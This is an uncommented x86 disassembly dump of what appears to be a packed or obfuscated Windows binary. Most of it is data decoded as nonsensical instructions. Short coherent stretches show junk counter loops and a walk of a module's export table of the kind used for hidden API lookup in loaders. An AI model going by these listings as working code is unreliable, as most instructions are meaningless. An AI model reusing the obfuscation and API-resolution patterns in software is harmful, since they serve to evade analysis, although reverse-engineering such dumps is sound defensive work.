  413a75:	fbld   TBYTE PTR [ebp+0x35]
  413a78:	sub    BYTE PTR [ecx-0x1f7ac2f0],0x56
  413a7f:	rol    DWORD PTR [eax],cl
  413a81:	adc    BYTE PTR [ecx+0x26956c39],bl
  413a87:	test   eax,0xfe6383ea
  413a8c:	sub    al,0x19
  413a8e:	stos   BYTE PTR es:[edi],al
  413a8f:	xchg   ecx,eax
  413a90:	sub    bh,bh
  413a92:	xor    edi,esi
  413a94:	fs dec ebp
  413a96:	mov    ds:0x37f84d53,eax
  413a9b:	into   
  413a9c:	dec    ebp
  413a9d:	and    eax,0xc2163167
  413aa2:	imul   edx,DWORD PTR [ebp-0xe74de43],0x4f25fad6
  413aac:	inc    esi
  413aad:	popa   
  413aae:	lods   eax,DWORD PTR ds:[esi]
  413aaf:	and    BYTE PTR [edi+ebp*2],dh
  413ab2:	into   
  413ab3:	cli    
  413ab4:	fld    TBYTE PTR [ecx+0x6]
  413ab7:	mov    dl,0xf8
  413ab9:	mov    ah,0x42
  413abb:	mov    cl,0x5d
  413abd:	cwde   
  413abe:	test   dl,0x1e
  413ac1:	add    DWORD PTR [eax],ebx
  413ac3:	inc    edi
  413ac4:	fisubr WORD PTR [eax+0x65]
  413ac7:	stc    
  413ac8:	pop    ecx
  413ac9:	pusha  
  413aca:	popf   
  413acb:	adc    DWORD PTR [ebx],ebp
  413acd:	dec    eax
  413ace:	xchg   ebp,eax
  413acf:	push   ecx
  413ad0:	xchg   esi,eax
  413ad1:	popf   
  413ad2:	clc    
  413ad3:	add    BYTE PTR [esi-0x55],ch
  413ad6:	fs jmp 0x61259923
  413adc:	dec    edx
  413add:	out    0x4b,al
  413adf:	jnp    0x413b1f
  413ae1:	test   dl,ah
  413ae3:	lods   al,BYTE PTR ds:[esi]
  413ae4:	into   
  413ae5:	cmp    eax,0x4a8805ab
  413aea:	jg     0x413afd
  413aec:	dec    eax
  413aed:	fsubr  DWORD PTR [ebp-0x626587f3]
  413af3:	int    0x93
  413af5:	fucomip st,st(4)
  413af7:	out    0x7a,al
  413af9:	stc    
  413afa:	mov    edi,0x62eccf91
  413aff:	sub    eax,0x33260858
  413b04:	loope  0x413b10
  413b06:	add    DWORD PTR [ebx-0x6386d4d7],esi
  413b0c:	adc    ebx,DWORD PTR [ecx]
  413b0e:	faddp  st(7),st
  413b10:	cmp    eax,0x226f9de4
  413b15:	stos   DWORD PTR es:[edi],eax
  413b16:	inc    ebp
  413b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b18:	dec    edx
  413b19:	add    DWORD PTR [edx+0x11f72da2],edi
  413b1f:	(bad)  
  413b20:	or     DWORD PTR [edi-0x6],esi
  413b23:	bnd jne 0x413b15
  413b26:	pop    eax
  413b27:	mov    ecx,0xcde3ced1
  413b2c:	ins    BYTE PTR es:[edi],dx
  413b2d:	push   cs
  413b2e:	not    eax
  413b30:	enter  0xc60,0x1f
  413b34:	pop    esi
  413b35:	stos   DWORD PTR es:[edi],eax
  413b36:	add    eax,0xe1b3abf5
  413b3b:	mov    ah,0x24
  413b3d:	pop    ecx
  413b3e:	inc    edi
  413b3f:	or     ebp,DWORD PTR [edi]
  413b41:	sahf   
  413b42:	mov    ebx,fs
  413b44:	in     eax,0xb9
  413b46:	in     al,dx
  413b47:	mov    edi,0x996d27bb
  413b4c:	pop    es
  413b4d:	call   DWORD PTR [eax+0x7ed5e9]
  413b53:	or     DWORD PTR [edi],0x15
  413b56:	mov    al,ds:0x338bfe33
  413b5b:	mov    dl,0x96
  413b5d:	(bad)  
  413b5f:	inc    edx
  413b60:	aad    0xfa
  413b62:	pop    edx
  413b63:	or     BYTE PTR [ebp+0x73],bh
  413b66:	cmp    eax,0xcfcfdf94
  413b6b:	sbb    ebp,0x4a66686a
  413b71:	(bad)  
  413b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b73:	ja     0x413b5e
  413b75:	sbb    bh,bl
  413b77:	ret    
  413b78:	jno    0x413be1
  413b7a:	in     al,dx
  413b7b:	mov    WORD PTR [ecx-0x2e4cb647],ds
  413b81:	gs dec edx
  413b83:	push   es
  413b84:	fucomp st(5)
  413b86:	cmp    bl,bl
  413b88:	lds    edi,FWORD PTR [eax+0x44]
  413b8b:	retf   0xbad2
  413b8e:	cdq    
  413b8f:	or     al,0x93
  413b91:	mov    esp,0xba4366c2
  413b96:	stos   DWORD PTR es:[edi],eax
  413b97:	daa    
  413b98:	pusha  
  413b99:	sar    esp,1
  413b9b:	imul   eax,DWORD PTR [edx-0x29],0xffffffc5
  413b9f:	cmp    ebp,esp
  413ba1:	aam    0xeb
  413ba3:	xchg   ecx,eax
  413ba4:	lds    esi,FWORD PTR [ecx]
  413ba6:	adc    eax,0x37a404cc
  413bab:	pop    ebp
  413bac:	ficom  WORD PTR ds:[ebx+eiz*1-0x432d68e5]
  413bb4:	popf   
  413bb5:	lods   al,BYTE PTR ds:[esi]
  413bb6:	xchg   edi,eax
  413bb7:	mov    al,ds:0x5d527608
  413bbc:	add    edx,DWORD PTR [ebp+0x75]
  413bbf:	in     eax,0x6c
  413bc1:	cmp    BYTE PTR [eax+0x317b204b],dh
  413bc7:	shl    DWORD PTR [ebp+0x59aa8c30],0xcd
  413bce:	dec    ebp
  413bcf:	jp     0x413bc8
  413bd1:	push   es
  413bd2:	fist   WORD PTR [esi]
  413bd4:	test   al,0x63
  413bd6:	inc    ecx
  413bd7:	mov    ah,0xc0
  413bd9:	cmp    cl,BYTE PTR [ebp-0x4c]
  413bdc:	or     BYTE PTR [ebx+0x6867e0c3],bh
  413be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be3:	xor    ebx,0xa6bfa6d7
  413be9:	sbb    BYTE PTR [esi-0x55],ch
  413bec:	jmp    0x5104c4e8
  413bf1:	sub    al,0x2b
  413bf3:	inc    ecx
  413bf4:	daa    
  413bf5:	mov    bh,0x2a
  413bf7:	cwde   
  413bf8:	repnz ins BYTE PTR es:[edi],dx
  413bfa:	stos   DWORD PTR es:[edi],eax
  413bfb:	mov    ds:0x66b1ec16,al
  413c00:	in     eax,0xa9
  413c02:	popa   
  413c03:	shl    BYTE PTR [edx-0x748646cb],1
  413c09:	js     0x413bcb
  413c0b:	ins    DWORD PTR es:[edi],dx
  413c0c:	add    eax,DWORD PTR [ecx+0x2da51e37]
  413c12:	dec    esi
  413c13:	sub    DWORD PTR ds:0x8d894c58,edx
  413c19:	test   DWORD PTR [ecx+edi*8],esp
  413c1c:	(bad)  
  413c1d:	adc    bl,BYTE PTR [ecx+ebx*1+0x436a97e6]
  413c24:	inc    ebp
  413c25:	jbe    0x413bcb
  413c27:	push   ss
  413c28:	adc    bh,dl
  413c2a:	mov    eax,0x106ca194
  413c2f:	mov    ebp,0x52893b20
  413c34:	jmp    0xe0cd:0x56b6815d
  413c3b:	xchg   edi,eax
  413c3c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c3e:	test   al,0xa
  413c40:	push   ds
  413c41:	into   
  413c42:	or     al,0x2a
  413c44:	mov    ch,0x9
  413c46:	rcl    BYTE PTR [ebx+0x6cb0ac19],1
  413c4c:	cmp    ebx,DWORD PTR [ebp-0x14]
  413c4f:	icebp  
  413c50:	xor    eax,0x6742717c
  413c55:	mov    edx,0x1c3ca4e3
  413c5a:	or     al,0xa6
  413c5c:	mov    edx,0x80581e4e
  413c61:	add    BYTE PTR [eax],ah
  413c63:	ror    eax,0xc
  413c66:	jbe    0x413cb9
  413c68:	and    edi,DWORD PTR [eax+0x4]
  413c6b:	xor    cl,BYTE PTR [edi+edx*4-0x3a]
  413c6f:	fdivr  QWORD PTR [edi+0x9]
  413c72:	pop    ecx
  413c73:	call   0x234edb5c
  413c78:	or     al,0x41
  413c7a:	ret    0xe9e
  413c7d:	fwait
  413c7e:	adc    ah,bh
  413c80:	(bad)  
  413c81:	not    DWORD PTR [edi-0x1e8023a5]
  413c87:	bound  edx,QWORD PTR [edi]
  413c89:	inc    edx
  413c8a:	push   ecx
  413c8b:	sub    bh,dl
  413c8d:	js     0x413ccc
  413c8f:	les    edx,FWORD PTR [ecx-0x3a]
  413c92:	adc    al,0x52
  413c94:	rcr    ebp,0xa
  413c97:	xchg   ebx,eax
  413c98:	mov    ds:0x38bb10ba,al
  413c9d:	mov    eax,ds:0xfb84cdc6
  413ca2:	icebp  
  413ca3:	add    DWORD PTR [edi-0x45],edx
  413ca6:	sub    eax,0xd4555304
  413cab:	lods   al,BYTE PTR ds:[esi]
  413cac:	arpl   WORD PTR [esi],di
  413cae:	and    bl,ch
  413cb0:	(bad)  
  413cb1:	ins    DWORD PTR es:[edi],dx
  413cb2:	pop    ecx
  413cb3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413cb5:	fcmovbe st,st(3)
  413cb7:	js     0x413d00
  413cb9:	test   DWORD PTR [eax-0x1fbe9dc4],ecx
  413cbf:	xchg   esp,eax
  413cc0:	sbb    BYTE PTR [eax+edi*1+0x2ce4fb4],ch
  413cc7:	cdq    
  413cc8:	mov    esp,0x9c38cb28
  413ccd:	push   0x3d8547c1
  413cd2:	shr    DWORD PTR [ecx],0xf9
  413cd5:	xor    bl,ah
  413cd7:	sbb    DWORD PTR [eax+0x79],ebx
  413cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cdb:	lds    edx,FWORD PTR [esi+0x5d]
  413cde:	mov    ecx,0xb284760b
  413ce3:	aad    0x98
  413ce5:	out    dx,eax
  413ce6:	rcl    BYTE PTR [edx],cl
  413ce8:	xchg   DWORD PTR [edx-0x44],edi
  413ceb:	pop    ebx
  413cec:	(bad)  
  413ced:	or     eax,ecx
  413cef:	test   al,0xfa
  413cf1:	push   0xd590d213
  413cf6:	repz in eax,dx
  413cf8:	js     0x413cb9
  413cfa:	into   
  413cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cfc:	pop    ds
  413cfd:	xchg   ebx,eax
  413cfe:	test   al,0x15
  413d00:	add    DWORD PTR [ecx+esi*1-0x72],ebx
  413d04:	pop    es
  413d05:	sbb    DWORD PTR [esi+ebx*8+0x22248b3f],0xffffffaa
  413d0d:	stos   DWORD PTR es:[edi],eax
  413d0e:	pusha  
  413d0f:	sub    edx,eax
  413d11:	mov    eax,0x7af102e6
  413d16:	ds (bad) 
  413d18:	sbb    bl,bl
  413d1a:	inc    edi
  413d1b:	cmp    BYTE PTR [eax],al
  413d1d:	push   eax
  413d1e:	dec    edi
  413d1f:	leave  
  413d20:	in     eax,0xfc
  413d22:	add    DWORD PTR es:[esi+0x6300b0f4],ebx
  413d29:	ja     0x413d2b
  413d2b:	jg     0x413cec
  413d2d:	rcr    dh,0x9d
  413d30:	pop    ds
  413d31:	je     0x413dac
  413d33:	mov    ch,BYTE PTR [esi+0x67]
  413d36:	sbb    al,0x8c
  413d38:	pusha  
  413d39:	jns    0x413cc4
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e77f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e77f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e77f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e5eb
  413d7f:	cmp    DWORD PTR ds:0x42e77f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e77f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e77f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e77f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e77f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e78f,0x42fe06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e1ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e777
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fd59,0x42e1a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e77b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e77b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e77b,eax
  413e08:	cmp    DWORD PTR ds:0x42e77b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e77b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e50b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e777,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e783
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e19c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e77b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)
  413e8e:	outs   dx,DWORD PTR ds:[esi]
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e57
  413e98:	mov    al,0xd0
  413e9a:	popa   
  413e9b:	dec    esp
  413e9c:	int3   
  413e9d:	mov    ebp,0x8c72baac
  413ea2:	imul   DWORD PTR [esi-0x358fccde]
  413ea8:	inc    ebp
  413ea9:	ret    0x5b00
  413eac:	mov    esp,0x1e262b58
  413eb1:	repz adc BYTE PTR [ecx],cl
  413eb4:	push   es
  413eb5:	scas   al,BYTE PTR es:[edi]
  413eb6:	mov    DWORD PTR [esi+esi*4-0x6d1acc40],esi
  413ebd:	sbb    esi,ebx
  413ebf:	adc    al,0xf1
  413ec1:	jmp    esi
  413ec3:	adc    BYTE PTR [edx+0x2b749fac],bl
  413ec9:	nop
  413eca:	xchg   ebx,eax
  413ecb:	jbe    0x413e58
  413ecd:	ret    
  413ece:	push   0xeb2b852d
  413ed3:	mov    bl,0xde
  413ed5:	mov    edi,0x2ce4828e
  413eda:	cmp    BYTE PTR [bp+si-0x1ae8],bh
  413edf:	mov    dh,0x8d
  413ee1:	std    
  413ee2:	mov    ?,WORD PTR [edi]
  413ee4:	stc    
  413ee5:	sbb    BYTE PTR [ecx+0x48691d17],al
  413eeb:	mov    ah,ah
  413eed:	xchg   esp,eax
  413eee:	int    0xca
  413ef0:	adc    ebx,esp
  413ef2:	jmp    0xac6c:0x4de67ca8
  413ef9:	xchg   ebp,eax
  413efa:	repnz pop ecx
  413efc:	and    al,0x72
  413efe:	icebp  
  413eff:	out    dx,eax
  413f00:	in     eax,0xad
  413f02:	das    
  413f03:	xchg   ebp,eax
  413f04:	sub    bl,BYTE PTR [ebx]
  413f06:	aas    
  413f07:	pusha  
  413f08:	pop    es
  413f09:	iret   
  413f0a:	xor    eax,edx
  413f0c:	shl    BYTE PTR [eax],0xf5
  413f0f:	pop    esp
  413f10:	jmp    0x6c4f0eec
  413f15:	daa    
  413f16:	cmp    esi,DWORD PTR [edx-0x70ba9c96]
  413f1c:	mov    edi,0x8191e2b1
  413f21:	jmp    0x413f15
  413f23:	jp     0x413f60
  413f25:	adc    esp,esi
  413f27:	call   0x667a:0x4f9ee131
  413f2e:	es dec ebp
  413f30:	push   ss
  413f31:	js     0x413f82
  413f33:	push   es
  413f34:	imul   esi,DWORD PTR [ecx+0x4a],0xffffffe4
  413f38:	push   es
  413f39:	pop    esp
  413f3a:	mov    BYTE PTR [ecx],bh
  413f3c:	(bad)  
  413f3d:	loopne 0x413ee2
  413f3f:	mov    edi,DWORD PTR [esp+esi*8-0x625484be]
  413f46:	sbb    BYTE PTR [ebx-0x6d885dfc],0x5b
  413f4d:	enter  0x1561,0x2b
  413f51:	mov    ebx,0xcbc4c73b
  413f56:	imul   eax,DWORD PTR [ebp+edi*4-0x28],0xffffffea
  413f5b:	test   DWORD PTR [ecx+0x66],edi
  413f5e:	mov    ?,edi
  413f60:	out    dx,eax
  413f61:	test   BYTE PTR [ebx-0x4c4b7ff8],ch
  413f67:	pop    ebp
  413f68:	sahf   
  413f69:	ret    
  413f6a:	ins    BYTE PTR es:[edi],dx
  413f6b:	leave  
  413f6c:	scas   eax,DWORD PTR es:[edi]
  413f6d:	aaa    
  413f6e:	int3   
  413f6f:	cmp    al,dh
  413f71:	xchg   edx,eax
  413f72:	test   ch,bh
  413f74:	cmp    cl,cl
  413f76:	add    ah,ch
  413f78:	sahf   
  413f79:	mov    ecx,0x82afb53e
  413f7e:	and    ebx,DWORD PTR [eax-0x3a]
  413f81:	in     al,0xb0
  413f83:	fwait
  413f84:	jle    0x413f1f
  413f86:	jns    0x413f0f
  413f88:	js     0x413fc9
  413f8a:	popf   
  413f8b:	repz mov dl,0xf9
  413f8e:	jno    0x413f35
  413f90:	enter  0x214,0xf4
  413f94:	sbb    esi,DWORD PTR [ebx-0x19]
  413f97:	out    dx,al
  413f98:	outs   dx,BYTE PTR ds:[esi]
  413f99:	adc    al,0xb7
  413f9b:	daa    
  413f9c:	in     al,0x69
  413f9e:	pop    ebx
  413f9f:	sbb    eax,0x63d1349c
  413fa4:	xchg   esi,eax
  413fa5:	xchg   ebx,eax
  413fa6:	stos   BYTE PTR es:[edi],al
  413fa7:	mov    eax,ds:0xe2410b7b
  413fac:	add    eax,0xdf252396
  413fb1:	pushf  
  413fb2:	mov    dh,0xf2
  413fb4:	mov    ebp,ecx
  413fb6:	jmp    0x413f68
  413fb8:	push   ebp
  413fb9:	mov    bh,0xd2
  413fbb:	pop    eax
  413fbc:	(bad)
  413fc0:	das    
  413fc1:	or     ah,bl
  413fc3:	outs   dx,DWORD PTR ds:[esi]
  413fc4:	jae    0x413fd9
  413fc6:	fwait
  413fc7:	sbb    bh,BYTE PTR [eax+esi*2-0x80]
  413fcb:	fsubr  st(0),st
  413fcd:	pop    ecx
  413fce:	adc    dh,BYTE PTR ds:0x20c07152
  413fd4:	stos   DWORD PTR es:[edi],eax
  413fd5:	test   eax,0xa47a50c8
  413fda:	or     DWORD PTR [edi],esp
  413fdc:	push   0x3f
  413fde:	out    dx,eax
  413fdf:	lods   al,BYTE PTR ds:[esi]
  413fe0:	sbb    ebx,DWORD PTR [esi-0x470c1709]
  413fe6:	popf   
  413fe7:	jp     0x413f6b
  413fe9:	inc    esp
  413fea:	xchg   ebx,eax
  413feb:	aam    0x3b
  413fed:	jg     0x413f71
  413fef:	mov    cs,ebp
  413ff1:	push   ebx
  413ff2:	sub    al,0x1d
  413ff4:	stos   BYTE PTR es:[edi],al
  413ff5:	in     eax,dx
  413ff6:	cld    
  413ff7:	in     al,dx
  413ff8:	ss push 0xd608b22c
  413ffe:	std    
  413fff:	(bad)  
  414000:	repnz stos BYTE PTR es:[edi],al
  414002:	add    eax,DWORD PTR [edi]
  414004:	ds cld 
  414006:	adc    al,0x1f
  414008:	arpl   WORD PTR [ecx],bx
  41400a:	icebp  
  41400b:	lds    eax,FWORD PTR [eax]
  41400d:	stos   BYTE PTR es:[edi],al
  41400e:	leave  
  41400f:	fs or  eax,0xaf40c63c
  414015:	jae    0x414056
  414017:	in     al,dx
  414018:	shr    DWORD PTR [ecx+ebx*4+0x3d],cl
  41401c:	addr16 sub al,0xce
  41401f:	cdq    
  414020:	dec    esi
  414021:	fwait
  414022:	mov    ebx,0xda5f8f68
  414027:	(bad)  
  414028:	ror    ah,0xbf
  41402b:	inc    ebx
  41402c:	aam    0xc3
  41402e:	adc    ebx,ebx
  414030:	cmp    DWORD PTR [ebx+0x515e543f],eax
  414036:	movaps xmm6,XMMWORD PTR [ecx-0x5d35bf41]
  41403d:	sub    bh,BYTE PTR [edi-0x6c]
  414040:	push   es
  414041:	pop    ebx
  414042:	or     eax,0x51f4027
  414047:	retf   
  414048:	and    BYTE PTR [ecx],al
  41404a:	in     eax,0xe8
  41404c:	jmp    0x414037
  41404e:	(bad)  
  41404f:	lods   al,BYTE PTR ds:[esi]
  414050:	sbb    al,0xe5
  414052:	cwde   
  414053:	mov    ?,WORD PTR [ecx+0x570fc154]
  414059:	stos   DWORD PTR es:[edi],eax
  41405a:	sbb    eax,0xfc36cfe0
  41405f:	sub    bh,dh
  414061:	push   ecx
  414062:	mov    ss,WORD PTR [ecx+0x3b]
  414065:	sbb    al,0x2a
  414067:	mov    ebp,0x8427b797
  41406c:	or     cl,BYTE PTR [eax]
  41406e:	adc    ecx,DWORD PTR [edx-0x37]
  414071:	dec    esi
  414072:	pop    eax
  414073:	dec    edx
  414074:	mov    WORD PTR [edi],es
  414076:	mov    cl,0xc0
  414078:	or     al,0x6b
  41407a:	xchg   ebx,eax
  41407b:	ja     0x414065
  41407d:	pop    edx
  41407e:	mov    al,ds:0xf8ae1dc0
  414083:	mov    dl,0x2e
  414085:	pop    ss
  414086:	outs   dx,BYTE PTR ds:[esi]
  414087:	in     eax,dx
  414088:	outs   dx,BYTE PTR ds:[esi]
  414089:	or     bl,BYTE PTR [ecx]
  41408b:	cli    
  41408c:	cmc    
  41408d:	loope  0x414063
  41408f:	hlt    
  414090:	jg     0x414083
  414092:	frstor [esp+esi*2+0xc]
  414096:	adc    DWORD PTR [ebx],edi
  414098:	push   edi
  414099:	popf   
  41409a:	lahf   
  41409b:	cwde   
  41409c:	shl    edi,1
  41409e:	(bad)  
  41409f:	xchg   BYTE PTR ds:0xf66349b,ch
  4140a5:	ss ins BYTE PTR es:[edi],dx
  4140a7:	dec    ebx
  4140a8:	add    bl,ch
  4140aa:	(bad)  
  4140ab:	jo     0x414060
  4140ad:	icebp  
  4140ae:	pop    ss
  4140af:	and    esi,DWORD PTR [eax]
  4140b1:	sub    ebp,DWORD PTR [ebx]
  4140b3:	xor    eax,0xd4af063e
  4140b8:	retf   
  4140b9:	cmc    
  4140ba:	xlat   BYTE PTR ds:[ebx]
  4140bb:	push   edi
  4140bc:	mov    ecx,0xafcca2ff
  4140c1:	icebp  
  4140c2:	mov    ebp,0xd148f31f
  4140c7:	pop    ds
  4140c8:	xchg   ebp,eax
  4140c9:	dec    esp
  4140ca:	test   ebx,ebx
  4140cc:	repz mul DWORD PTR [esi+esi*4]
  4140d0:	clc    
  4140d1:	and    eax,0xf0de8456
  4140d6:	mov    eax,?
  4140d8:	mov    ds:0x9f714ac6,eax
  4140dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140de:	out    0x68,eax
  4140e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140e1:	pop    ecx
  4140e2:	jns    0x4140a1
  4140e4:	xor    BYTE PTR [eax+ebx*4+0x42],cl
  4140e8:	pop    ebp
  4140e9:	pop    esi
  4140ea:	sub    BYTE PTR [eax+0x11],cl
  4140ed:	xchg   ecx,eax
  4140ee:	mov    BYTE PTR ss:[ebx],dh
  4140f1:	cmp    esi,edx
  4140f3:	fild   WORD PTR [ebx+0x7c]
  4140f6:	mov    gs,WORD PTR [ecx]
  4140f8:	popf   
  4140f9:	add    eax,0x45275c51
  4140fe:	xchg   ebp,eax
  4140ff:	aas    
  414100:	fdivp  st(1),st
  414102:	mov    ecx,0x284aea3c
  414107:	sahf   
  414108:	aas    
  414109:	jg     0x41417b
  41410b:	dec    ecx
  41410c:	xchg   esi,eax
  41410d:	inc    BYTE PTR [eax]
  41410f:	test   cl,ch
  414111:	ret    
  414112:	xchg   esp,eax
  414113:	test   DWORD PTR [ebx-0x4e],edi
  414116:	sub    edi,DWORD PTR [esi+0x32]
  414119:	push   0xfffffff8
  41411b:	retf   
  41411c:	xchg   edi,eax
  41411d:	leave  
  41411e:	mov    ah,0x64
  414120:	pop    esp
  414121:	mov    eax,ds:0xca5436d8
  414126:	push   edx
  414127:	stc    
  414128:	loop   0x414123
  41412a:	pop    edx
  41412b:	pop    es
  41412c:	jmp    0x1ba8779f
  414131:	lahf   
  414132:	icebp  
  414133:	lahf   
  414134:	repz inc ebp
  414136:	retf   
  414137:	mov    ds:0x35920bae,eax
  41413c:	stc    
  41413d:	imul   ebp,DWORD PTR [esi-0x6d03afe3],0x982783b4
  414147:	jae    0x41412a
  414149:	dec    esp
  41414a:	sar    BYTE PTR [esi],0x7c
  41414d:	ficom  WORD PTR [edi-0x5f]
  414150:	aam    0xc9
  414152:	gs es push 0x1c
  414156:	inc    ebx
  414157:	test   BYTE PTR [ebx-0x37],ah
  41415a:	outs   dx,BYTE PTR ds:[esi]
  41415b:	ret    
  41415c:	inc    esi
  41415d:	dec    DWORD PTR [ebx+0x2581ec45]
  414163:	push   ebp
  414164:	std    
  414165:	inc    edx
  414166:	add    BYTE PTR [eax],al
  414168:	add    BYTE PTR [eax],al
  41416a:	add    BYTE PTR [ebx+0x42fd550d],cl
  414170:	add    BYTE PTR [ecx-0x77],al
  414173:	or     eax,0x42fd55
  414178:	cmp    DWORD PTR ds:0x42fd55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e5ef
  41418b:	cmp    DWORD PTR ds:0x42fd55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fd59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e77f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fd69
  4141ba:	sbb    DWORD PTR ds:0x42fd55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd85,0x42e793
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e76b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e78f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fd5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fd5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fd5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fd5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e5f3
  41423b:	cmp    DWORD PTR ds:0x42fd5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fd5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fd5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fd5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142c0
  414283:	bound  ebp,QWORD PTR [edi+0x6c]
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0xbd70707e
  41428f:	jle    0x4142b6
  414291:	repz jmp 0xbd770faf
  414297:	es cdq 
  414299:	imul   esp,DWORD PTR ds:0xa27f681f,0x5c34a510
  4142a3:	push   ebx
  4142a4:	pusha  
  4142a5:	xor    ebx,DWORD PTR [eax+0x74]
  4142a8:	mov    esp,0xaabbd425
  4142ad:	dec    ebp
  4142ae:	adc    al,0xa1
  4142b0:	je     0x41426c
  4142b2:	rol    DWORD PTR [edx],1
  4142b4:	mov    esp,ebx
  4142b6:	data16 fist DWORD PTR [esi-0x10]
  4142ba:	xchg   ecx,eax
  4142bb:	lds    edx,FWORD PTR [ebx]
  4142bd:	jmp    0x41431c
